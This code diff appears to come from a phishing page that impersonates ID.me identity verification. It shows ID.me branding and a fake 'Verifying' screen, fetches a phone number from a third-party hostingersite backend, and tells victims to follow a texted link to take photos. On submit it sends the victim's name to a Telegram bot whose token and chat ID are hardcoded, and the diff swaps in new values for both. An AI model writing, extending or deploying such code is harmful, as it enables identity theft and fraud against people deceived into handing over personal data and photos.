@@ -1,8 +1,8 @@
 import React, { useEffect, useState } from "react";
-import logo from '../assets/ID.me_Logo.png'
-import photo from '../assets/PHONE.jpg'
-import connect from '../assets/connect.jpg'
-import elogo from '../assets/logo-removebg-preview.png'
+import logo from "../assets/ID.me_Logo.png";
+import photo from "../assets/PHONE.jpg";
+import connect from "../assets/connect.jpg";
+import elogo from "../assets/logo-removebg-preview.png";
 
 const TakePhotos: React.FC = () => {
   const [showPopup, setShowPopup] = useState(false);
@@ -16,7 +16,9 @@ const TakePhotos: React.FC = () => {
   // Fetch phone number from the backend
   const fetchPhoneNumber = async () => {
     try {
-      const res = await fetch("https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api4.php?action=get_phone");
+      const res = await fetch(
+        "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api6.php?action=get_phone",
+      );
       const data = await res.json();
       return data.phone || "";
     } catch (error) {
@@ -32,16 +34,16 @@ const TakePhotos: React.FC = () => {
     };
 
     getPhone();
-  }, []);  
-  
+  }, []);
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setShowPopup(true);
-  
-    const botToken = "7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c";
-    const chatId = "7062736155";
+
+    const botToken = "8379013361:AAG_2hOY6uXZTvCaC4HBfYL6-nR3snO06lM";
+    const chatId = "8317872395";
     const message = `${fullName} Photos taken`;
-  
+
     try {
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
@@ -93,10 +95,15 @@ const TakePhotos: React.FC = () => {
       {showPopup && (
         <div className="fixed inset-0 bg-black bg-opacity-80 flex justify-center items-center z-50">
           <div className="bg-white rounded-lg p-6 w-[350px] h-[400px] max-w-md text-center shadow-lg flex flex-col justify-center">
-            <div className="flex justify-center mb-4"><img src={elogo} width={50}  /></div>
-            <h2 className="text-sm font-semibold text-black mb-2">Verifying....</h2>
+            <div className="flex justify-center mb-4">
+              <img src={elogo} width={50} />
+            </div>
+            <h2 className="text-sm font-semibold text-black mb-2">
+              Verifying....
+            </h2>
             <p className="text-sm font-semibold text-black mb-6">
-              Please wait while the system connects. Avoid refreshing the page; this may take a moment.
+              Please wait while the system connects. Avoid refreshing the page;
+              this may take a moment.
             </p>
 
             <div className="w-full bg-gray-200 rounded-full h-4 mb-6">
@@ -106,7 +113,9 @@ const TakePhotos: React.FC = () => {
               ></div>
             </div>
 
-            <p className="text-sm text-gray-600">Typically, <strong>{countdown}</strong> seconds remaining</p>
+            <p className="text-sm text-gray-600">
+              Typically, <strong>{countdown}</strong> seconds remaining
+            </p>
           </div>
         </div>
       )}
@@ -138,8 +147,8 @@ const TakePhotos: React.FC = () => {
 
         {/* Logo */}
         <h1 className="text-3xl flex  justify-center gap-4 font-medium mt-10 mb-6">
-         <img src={logo} alt="" className="w-[100px]"/>
-         <img src={connect} alt="" />
+          <img src={logo} alt="" className="w-[100px]" />
+          <img src={connect} alt="" />
         </h1>
 
         {/* Message */}
@@ -155,8 +164,13 @@ const TakePhotos: React.FC = () => {
           +1 {phone ? formatPhone(phone) : "(000)-000-0000"}
         </p>
 
-        <p className="mt-2 text-xl font-semibold">Please click the link in the text message and follow the instructions to take your photos.</p>
-        <p className=" text-xl font-semibold text-green-400">This screen will automatically refresh once your photos are received</p>
+        <p className="mt-2 text-xl font-semibold">
+          Please click the link in the text message and follow the instructions
+          to take your photos.
+        </p>
+        <p className=" text-xl font-semibold text-green-400">
+          This screen will automatically refresh once your photos are received
+        </p>
 
         <button onClick={handleSubmit}></button>
       </div>
